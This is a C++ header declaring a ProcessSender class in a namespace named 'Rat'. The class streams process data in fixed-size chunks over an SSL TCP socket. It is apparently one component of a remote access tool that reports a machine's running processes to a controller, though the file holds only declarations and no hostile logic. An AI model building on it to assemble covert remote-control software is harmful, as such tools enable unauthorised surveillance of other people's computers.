#ifndef PROCESS_SENDER_HPP
#define PROCESS_SENDER_HPP

#include <memory>
#include <functional>
#include <string>
#include <vector>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include "Packet.pb.h"
#include "NetworkManager.hpp"

namespace Rat
{
    class ProcessSender : public std::enable_shared_from_this<ProcessSender>
    {
    public:
        ProcessSender(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket,
                      NetworkManager& networkManager,
                      const uint64_t& client_id,
                      const std::string& process_data);

        ~ProcessSender() = default;

        void sendProcesses(const std::string& data_id,
                           std::function<void()> on_finish,
                           std::function<void()> on_disconnect);

    private:
        void processNextChunk();

        std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_;
        NetworkManager& networkManager_;
        uint64_t client_id_;
        std::string process_data_;
        std::string data_id_;
        uint64_t sequence_ = 0;
        uint64_t total_chunks_ = 0;
        std::function<void()> on_finish_;
        std::function<void()> on_disconnect_;
        // std::vector<char> buffer_;
        static const size_t CHUNK_SIZE = 1024;
    };
} // namespace Rat

#endif // PROCESS_SENDER_HPP
